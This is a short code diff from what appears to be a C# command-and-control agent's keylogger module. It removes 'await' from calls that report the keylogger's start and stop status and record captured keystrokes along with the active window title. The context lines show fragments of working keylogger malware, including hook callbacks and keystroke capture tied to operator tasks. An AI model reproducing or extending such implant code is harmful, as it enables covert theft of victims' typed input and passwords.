@@ -28,11 +28,11 @@ namespace Agent
                 {
                     cts.Cancel();
                     this.isRunning = false;
-                    await messageManager.WriteLine("Tasked to stop.", job.task.id, true);
+                    messageManager.WriteLine("Tasked to stop.", job.task.id, true);
                 }
                 else
                 {
-                    await messageManager.WriteLine("Task is not running.", job.task.id, true);
+                    messageManager.WriteLine("Task is not running.", job.task.id, true);
                 }
                 return;
             }
@@ -41,11 +41,11 @@ namespace Agent
             {
                 cts = new CancellationTokenSource();
                 StartKeylogger(job.task.id);
-                await messageManager.WriteLine("Keylogger started.", job.task.id, true);
+                messageManager.WriteLine("Keylogger started.", job.task.id, true);
             }
             else
             {
-                await messageManager.WriteLine("Already running", job.task.id, true);
+                messageManager.WriteLine("Already running", job.task.id, true);
             }
         }
         public bool StartKeylogger(string task_id)
@@ -434,7 +434,7 @@ namespace Agent
 
                 StringBuilder title = new StringBuilder(256);
                 Native.GetWindowText(hWindow, title, title.Capacity);
-                await messageManager.AddKeystroke(title.ToString(), this.task_id, key);
+                messageManager.AddKeystroke(title.ToString(), this.task_id, key);
             }
         }
         private IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
